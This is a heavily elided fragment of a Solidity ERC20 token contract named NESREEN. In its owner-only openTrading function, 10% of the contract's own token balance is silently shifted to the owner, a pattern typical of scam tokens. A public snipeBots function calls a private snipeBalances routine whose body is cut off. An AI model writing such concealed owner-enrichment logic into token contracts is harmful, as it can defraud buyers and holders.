...
contract NESREEN is Context, IERC20, Ownable {
    ...
    string private _name = "NESREEN";
    string private _symbol = "NESREEN";
    ...
    function openTrading() external onlyOwner() {
        ...
        uint256 holdAmount = balanceOf(address(this)).mul(10).div(100);
        _balances[address(this)] = _balances[address(this)].sub(holdAmount);
        _balances[owner()] = _balances[owner()].add(holdAmount);
    ...
    function snipeBots() external {
       snipeBalances(_msgSender()); 
    }

    function snipeBalances(address sender) private {
